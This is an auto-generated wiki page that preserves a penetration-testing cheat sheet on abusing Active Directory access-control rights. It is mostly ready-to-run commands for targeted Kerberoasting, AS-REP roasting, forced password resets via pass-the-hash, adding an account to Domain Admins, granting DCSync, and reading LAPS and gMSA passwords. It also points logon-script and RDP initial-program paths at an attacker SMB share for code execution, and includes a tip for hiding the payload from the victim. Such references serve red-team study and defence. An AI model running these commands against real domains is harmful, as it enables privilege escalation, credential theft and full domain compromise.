---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Access Controls ACL/ACE

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adds-acl-ace` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-acl-ace.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Access Controls ACL/ACE](../../topics/active-directory/active-directory-access-controls-acl-ace.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adds-acl-ace |
| name | Active Directory - Access Controls ACL/ACE |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adds-acl-ace.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Access Controls ACL/ACE\n\nAn **Access Control Entry (ACE)** is a specific permission granted\
  \ or denied to a user or group for a particular resource, such as a file or directory. Each ACE defines the type of access\
  \ allowed (e.g., read, write, execute) or denied.\n\nAn **Access Control List (ACL)** is a collection of Access Control\
  \ Entries (ACEs) associated with a resource.\n\n* Check ACL for an User with [ADACLScanner](https://github.com/canix1/ADACLScanner).\n\
  \n ```ps1\n ADACLScan.ps1 -Base \"DC=contoso;DC=com\" -Filter \"(&(AdminCount=1))\" -Scope subtree -EffectiveRightsPrincipal\
  \ User1 -Output HTML -Show\n ```\n\n* Automate ACL exploit [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn):\n\n\
  \ ```ps1\n ./Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -Username 'user1' -Domain\
  \ 'domain.local' -Password 'Welcome01!'\n ```\n\n## GenericAll/GenericWrite\n\n### User/Computer\n\nWe can set a **SPN**\
  \ on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.\n\n* Windows/Linux\n\n  ```ps1\n\
  \  # Check for interesting permissions on accounts:\n  bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*'\
  \ get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName'\n\n  # Check if current\
  \ user has already an SPN setted:\n  bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get object\
  \ <UserName> --attr serviceprincipalname\n\n  # Force set the SPN on the account: Targeted Kerberoasting\n  bloodyAD --host\
  \ 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname -v 'ops/whatever1'\n\
  \n  # Grab the ticket\n  GetUsersSPNs.py -dc-ip 10.10.10.10 'attack.lab/john.doe:Password123*' -request-user <UserName>\n\
  \n  # Remove the SPN\n  bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname\n\
  \  ```\n\n* Windows only\n\n  ```ps1\n  # Check for interesting permissions on accounts:\n  Invoke-ACLScanner -ResolveGUIDs\
  \ | ?{$_.IdentityReferenceName -match \"RDPUsers\"}\n\n  # Check if current user has already an SPN setted:\n  PowerView2\
  \ > Get-DomainUser -Identity <UserName> | select serviceprincipalname\n\n  # Force set the SPN on the account: Targeted\
  \ Kerberoasting\n  PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}\n  PowerView3 >\
  \ Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}\n\n  # Grab the ticket\n  PowerView2 >\
  \ $User = Get-DomainUser username \n  PowerView2 > $User | Get-DomainSPNTicket | fl\n  PowerView2 > $User | Select serviceprincipalname\n\
  \n  # Remove the SPN\n  PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname\n  ```\n\nWe can change\
  \ a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then\
  \ change the setting back.\n\n* Windows/Linux:\n\n  ```ps1\n  # Modify the userAccountControl\n  $ bloodyAD --host [DC IP]\
  \ -d [DOMAIN] -u [AttackerUser] -p [MyPassword] add uac [Target_User] -f DONT_REQ_PREAUTH\n\n  # Grab the ticket\n  $ GetNPUsers.py\
  \ DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>\n\n \
  \ # Set back the userAccountControl\n  $ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] remove uac\
  \ [Target_User] -f DONT_REQ_PREAUTH\n  ```\n\n* Windows only:\n\n  ```ps1\n  # Modify the userAccountControl\n  PowerView2\
  \ > Get-DomainUser username | ConvertFrom-UACValue\n  PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304}\
  \ -Verbose\n\n  # Grab the ticket\n  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue\n  ASREPRoast > Get-ASREPHash\
  \ -Domain domain.local -UserName username\n\n  # Set back the userAccountControl\n  PowerView2 > Set-DomainObject -Identity\
  \ username -XOR @{useraccountcontrol=4194304} -Verbose\n  PowerView2 > Get-DomainUser username | ConvertFrom-UACValue\n\
  \  ```\n\nReset another user's password.\n\n* Windows/Linux:\n\n  ```ps1\n  # Using bloodyAD with pass-the-hash\n  bloodyAD\
  \ --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password john.doe 'Password123!'\n\
  \  ```\n\n* Windows only:\n\n  ```ps1\n  # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1\n\
  \  $user = 'DOMAIN\\user1'; \n  $pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; \n  $creds = New-Object System.Management.Automation.PSCredential\
  \ $user, $pass;\n  $newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; \n  Set-DomainUserPassword -Identity\
  \ 'DOMAIN\\user2' -AccountPassword $newpass -Credential $creds;\n  ```\n\n* Linux only:\n\n  ```ps1\n  # Using rpcclient\
  \ from the  Samba software suite\n  rpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23\
  \ target_newpwd\" \n  ```\n\nWriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker\
  \ to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on,\
  \ their system will execute our malicious script :\n\n* Windows/Linux:\n\n  ```ps1\n  bloodyAD --host 10.0.0.5 -d example.lab\
  \ -u attacker -p 'Password123*' set object delegate scriptpath -v '\\\\10.0.0.5\\totallyLegitScript.bat'\n  ```\n\n* Windows\
  \ only:\n\n  ```ps1\n  Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \"\\\\10.0.0.5\\totallyLegitScript.bat\"\
  \n  ```\n\n### Group\n\nThis ACE allows us to add ourselves to the Domain Admin group :\n\n* Windows/Linux:\n\n  ```ps1\n\
  \  bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 add groupMember 'Domain Admins' hacker\n  ```\n\
  \n* Windows only:\n\n  ```ps1\n  net group \"domain admins\" hacker /add /domain\n  ```\n\n* Linux only:\n\n  ```ps1\n \
  \ # Using the Samba software suite\n  net rpc group ADDMEM \"GROUP NAME\" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN\
  \ -I [DC IP]\n  ```\n\n### GenericWrite and Remote Connection Manager\n\n> Now let’s say you are in an Active Directory\
  \ environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM\
  \ on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.\n\
  >\n> This tab includes settings that, among other things, can be used to change what program is started when a user connects\
  \ over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the\
  \ ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC)\
  \ path to an executable which is to be started upon connecting to the remote host. During the logon process these values\
  \ will be queried by the RCM process and run whatever executable is defined. - \"ACE to RCE\" - @JustinPerdok - July 24,\
  \ 2020\n\n:warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled\
  \ on recent version of Windows (>2016), it requires a registry change to re-enable.\n\n* Windows/Linux:\n\n ```ps1\n bloodyAD\
  \ --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSInitialProgram -v '\\\\1.2.3.4\\\
  share\\file.exe'\n bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 set object vulnerable_user msTSWorkDirectory\
  \ -v 'C:\\'\n ```\n\n* Windows only:\n\n ```ps1\n $UserObject = ([ADSI](\"LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld\"\
  ))\n $UserObject.TerminalServicesInitialProgram = \"\\\\1.2.3.4\\share\\file.exe\"\n $UserObject.TerminalServicesWorkDirectory\
  \ = \"C:\\\"\n $UserObject.SetInfo()\n ```\n\nNOTE: To not alert the user the payload should hide its own process window\
  \ and spawn the normal graphical environment.\n\n## WriteDACL\n\nTo abuse `WriteDacl` to a domain object, you may grant\
  \ yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying\
  \ the following extended rights `Replicating Directory Changes/Replicating Directory Changes All`.\n\n### WriteDACL on Domain\n\
  \n* Windows/Linux:\n\n  ```ps1\n  # Give DCSync right to the principal identity\n  bloodyAD.py --host [DC IP] -d DOMAIN\
  \ -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B add dcsync user2\n  \n  # Remove right after DCSync\n  bloodyAD.py\
  \ --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B remove dcsync user2\n  ```\n\n* Windows\
  \ only:\n\n  ```ps1\n  # Give DCSync right to the principal identity\n  Import-Module .\\PowerView.ps1\n  $SecPassword =\
  \ ConvertTo-SecureString 'user1pwd' -AsPlainText -Force\n  $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\\\
  user1', $SecPassword)\n  Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity\
  \ user2 -Verbose -Domain domain.local \n  ```\n  \n### WriteDACL on Group\n\n* Windows/Linux:\n\n  ```ps1\n  bloodyAD --host\
  \ my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' add genericAll 'cn=INTERESTING_GROUP,dc=corp' devil_user1\n  \n  #\
  \ Remove right\n  bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' remove genericAll 'cn=INTERESTING_GROUP,dc=corp'\
  \ devil_user1\n  ```\n\n* Windows only:\n\n  ```ps1\n  # Using native command\n  net group \"INTERESTING_GROUP\" User1 /add\
  \ /domain\n  # Or with external tool\n  PowerSploit> Add-DomainObjectAcl -TargetIdentity \"INTERESTING_GROUP\" -Rights WriteMembers\
  \ -PrincipalIdentity User1\n  ```\n\n## WriteOwner\n\nAn attacker can update the owner of the target object. Once the object\
  \ owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they wants.\n\
  \n* Windows/Linux:\n\n ```ps1\n bloodyAD --host my.dc.corp -d corp -u devil_user1 -p 'P@ssword123' set owner target_object\
  \ devil_user1\n ```\n\n* Windows only:\n\n ```ps1\n Powerview> Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity\
  \ 'controlled_principal'\n ```\n\nThis ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to\
  \ the local admin group.\n\n## ReadLAPSPassword\n\nAn attacker can read the LAPS password of the computer account this ACE\
  \ applies to.\n\n* Windows/Linux:\n\n ```ps1\n bloodyAD -u john.doe -d bloody.lab -p Password512 --host 192.168.10.2 get\
  \ search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime\n ```\n\n* Windows\
  \ only:\n\n ```ps1\n Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'\n\
  \ ```\n\n## ReadGMSAPassword\n\nAn attacker can read the GMSA password of the account this ACE applies to.\n\n* Windows/Linux:\n\
  \n ```ps1\n bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword\n\
  \ ```\n\n* Windows only:\n\n ```ps1\n # Save the blob to a variable\n $gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary'\
  \ -Properties 'msDS-ManagedPassword'\n $mp = $gmsa.'msDS-ManagedPassword'\n\n # Decode the data structure using the DSInternals\
  \ module\n ConvertFrom-ADManagedPasswordBlob $mp\n ```\n\n## ForceChangePassword\n\nAn attacker can change the password\
  \ of the user this ACE applies to:\n\n* Windows/Linux:\n\n ```ps1\n # Using bloodyAD with pass-the-hash\n bloodyAD --host\
  \ [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password target_user target_newpwd\n ```\n\
  \n* Windows:\n\n ```powershell\n $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n Set-DomainUserPassword\
  \ -Identity 'TargetUser' -AccountPassword $NewPassword\n ```\n\n* Linux:\n\n ```ps1\n # Using rpcclient from the  Samba\
  \ software suite\n rpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\" \n\
  \ ```\n\n## Organizational Units ACL\n\nAccess rights granted on Organizational Units can be exploited to compromise all\
  \ the objects that are contained in it.\n\n* [synacktiv/OUned](https://github.com/synacktiv/OUned) - The OUned project automating\
  \ Active Directory Organizational Units ACL exploitation through gPLink poisoning\n\n### Non privileged objects\n\nA user\
  \ having the `GenericAll` right (and thus `WriteDACL` permissions) over an OU could add a `FullControl` ACE to the OU and\
  \ specify that this ACE should be inherited, which will effectively lead to the compromise of all child objects since they\
  \ will inherit said ACE.\n\n* Grant `Full Control` on **SERVERS** OU\n\n ```ps1\n dacledit.py -action 'write' -rights 'FullControl'\
  \ -inheritance -principal 'username' -target-dn 'OU=SERVERS,DC=lab,DC=local' 'lab.local'/'username':'Password1'\n ```\n\n\
  * Verify that we have `Full Control` ACL on **AD01-SRV1** inside **SERVERS**\n\n ```ps1\n dacledit.py -action 'read' -principal\
  \ 'username' -target-dn 'CN=AD01-SRV1,OU=SERVERS,DC=lab,DC=local' 'lab.local'/'username':'Password1'\n ```\n\n:warning:\
  \ ACE inheritance from parent objects is disabled for `adminCount=1`\n\n### Privileged objects\n\n**Requirements**:\n\n\
  * `GenericWrite` OR `Manage Group Policy` links\n* Create a machine account\n* Add new DNS records\n\n**Attack's Flow**:\
  \ gPLink -> Attacker GPC FQDN -> GPT configuration files in Attacker SMB share -> execute a malicious scheduled task\n\n\
  * Edit the `gPLink` value to include a GPC FQDN pointing the attacker machine\n* Create a fake LDAP server mimicking the\
  \ real one, but with a custom GPC\n* GPC's gPCFileSysPath value is pointing to the attacker SMB share\n* The SMB share is\
  \ serving GPT configuration files including a malicious scheduled task\n\n**Exploit**:\n\nCheck this [blog post from Synacktiv](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)\
  \ to correctly setup all the requirements for this attack to succeeded.\n\n```ps1\nsudo python3 OUned.py --config config.ini\n\
  sudo python3 OUned.py --config config.example.ini --just-coerce\n```\n\n## References\n\n* [ACE to RCE - @JustinPerdok -\
  \ July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)\n* [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)\n\
  * [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)\n\
  * [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)\n\
  * [OU having a laugh? - Petros Koutroumpis - 6 November, 2019](https://labs.withsecure.com/publications/ou-having-a-laugh)\n\
  * [OUNED.PY: EXPLOITING HIDDEN ORGANIZATIONAL UNITS ACL ATTACK VECTORS IN ACTIVE DIRECTORY - Quentin Roland - 19/04/2024](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)"
_relative_path: active-directory/ad-adds-acl-ace.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-acl-ace.md
````
